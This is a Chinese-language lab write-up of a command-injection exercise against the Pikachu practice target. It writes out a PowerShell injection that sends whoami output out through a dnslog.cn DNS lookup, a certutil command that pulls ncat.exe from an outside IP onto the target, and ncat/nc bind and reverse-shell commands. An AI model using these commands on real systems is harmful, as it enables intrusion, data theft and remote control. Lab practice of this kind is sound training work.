5.1实验

---

#实验环境 ：

- 阿里云+PHPStudy+pikachu （靶机）
- 服务器 （用作上传文件）

- window10              （攻击机）

#使用工具：

- Nmap （[Download the Free Nmap Security Scanner for Linux/Mac/Windows](https://nmap.org/download#windows)）
- DNSLog（[DNSLog Platform](http://dnslog.cn/)）
- pikachu（https://github.com/zhuifengshaonianhanlu/pikachu）
- 棱角社区（[[~\]#棱角 ::Edge.Forum*](https://forum.ywhack.com/bountytips.php)）

#实验步骤

1.设置pikachu数据库地址 

- 编辑inc\config.inc `服务器里面可能没有可以编辑PHP格式的建议下载一个Notepad++`

![image-20251017142524334](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017142524334.png)

![image-20251017144634453](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017144634453.png)

2.本机登陆靶机网站 输入`127.0.01数据有回显`

![image-20251017145400934](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017145400934.png)

3.在靶机中关闭回显 ctrl+f 搜索 echo

![image-20251017145919479](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017145919479.png)

`注释echo`

![image-20251017150055959](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017150055959.png)

4.网站无回显

![image-20251017150301157](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017150301157.png)

5.使用[DNSLog Platform](http://dnslog.cn/)网站

![image-20251017150504559](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017150504559.png)

利用window Poweshell命令 

127.0.0.1 | powershell $x = whoami;$x=$x.Replace('\\','xxx');$y='.z3xxl1.dnslog.cn';$z=$x+$y;ping $z 

- 因为cmd 无法运行 whoami
- 用Powershell变量赋值 把whoami 执行结果给变量
- 因为结果中带有==“\\”==导致ping命令无法执行
- 利用Replace 替换反斜杠变成“xxx”方面可读

==注意“\\”复制命令里面只有两个反斜杠需要删除一个反斜杠==

![image-20251017152502125](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017152502125.png)

6.利用ncat.exe

- 由于windows没有Linux自带的nc。我们需要在电脑上下载个Nmap（Nmap自带ncat.exe）

- Nmap下载地址（[Download the Free Nmap Security Scanner for Linux/Mac/Windows](https://nmap.org/download#windows)）

![image-20251017153515138](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017153515138.png)

- 把ncat上传到另一个服务器目录下 测试访问网址是否可以下载

  ![image-20251017171013453](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017171013453.png)

![image-20251017170945228](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017170945228.png)



- 打开棱角社区

![image-20251017171400116](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017171400116.png)

- 选用一个cmd命令因为靶机是windows系统

certutil.exe -urlcache -split -f http://47.120.15.58:80/ncat.exe c://ncat.exe  `放到c盘`

![image-20251017171522371](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017171522371.png)

- 输入命令

  ![image-20251017171744363](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017171744363.png)

127.0.0.1 | certutil.exe -urlcache -split -f http://47.120.15.58:80/ncat.exe c://ncat.exe

- 成功放入服务器c盘

![image-20251017171850870](C:\Users\Yennefer\AppData\Roaming\Typora\typora-user-images\image-20251017171850870.png)

7.运用正反向连接即可

1.主动连接

- 主动连接目标5566

​	ncat 47.122.23.131 5566

- 绑定SH到本地5566端口

​	ncat -e /bin/sh -lvp 5566

- 主动连接目标5566

​	nc 47.94.236.117 5566

2、反向连接：主动给出去，对方监听

- 绑定CMD到目标5566端口

​	ncat -e /bin/sh 47.122.23.131 5566

- 等待5566连接

​	nc -lvvp 5566

- 绑定CMD到目标5566端口

​	nc -e cmd 47.94.236.117 5566

- 等待5566连接

​	ncat -lvvp 5566